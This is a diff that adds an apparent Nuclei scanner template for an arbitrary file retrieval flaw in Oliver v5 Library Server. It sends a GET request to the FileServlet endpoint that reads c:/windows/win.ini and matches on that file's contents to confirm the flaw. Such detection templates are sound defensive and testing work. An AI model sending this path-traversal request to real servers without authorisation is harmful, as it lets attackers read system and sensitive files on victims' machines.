@@ -1,0 +1,24 @@
+id: oliver-library-lfi
+info:
+  author: gy741
+  description: An arbitrary file retrieval vulnerability in Oliver v5 Library Server
+    Versions < 8.00.008.053 via the FileServlet function allows for arbitrary file
+    retrieval by an attacker using unsanitized user supplied input.
+  name: Oliver Library Server v5 <8.00.008.053 - Arbitrary File Retrieval
+  reference:
+  - https://www.exploit-db.com/exploits/50599
+  - https://www.softlinkint.com/product/oliver/
+  severity: high
+  tags: windows,lfi,oliver
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  method: GET
+  path:
+  - '{{BaseURL}}/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini'
